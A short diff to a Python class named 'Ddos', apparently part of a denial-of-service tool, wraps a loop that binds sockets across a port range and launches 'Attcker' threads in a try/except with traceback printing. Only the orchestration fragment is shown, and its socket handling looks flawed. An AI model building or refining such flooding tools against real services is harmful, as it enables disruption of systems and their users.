@@ -1,6 +1,7 @@
 import socket
 import time
 from threading import Thread
+import traceback
 
 class Ddos:
     class ResultList(list):
@@ -22,13 +23,16 @@ class Ddos:
         analyzer = Analyzer()
         self.args["message"] = analyzer.sendMsg()
         for port in range(self.portRange):
-            self.args["port"] = port
-            sock.bind((self.args["ip"], port))
-            self.args["socket"] = sock
-            attacker = Attcker(self.args, resultList)
-            attacker.daemon = True
-            attacker.start()
-            self.nodes.append(attacker)
+            try:
+                self.args["port"] = port
+                sock.bind((self.args["ip"], port))
+                self.args["socket"] = sock
+                attacker = Attcker(self.args, resultList)
+                attacker.daemon = True
+                attacker.start()
+                self.nodes.append(attacker)
+            except:
+                traceback.print_exc()
         [node.join() for node in self.nodes]
         analyzer = Analyzer(resultList)
 
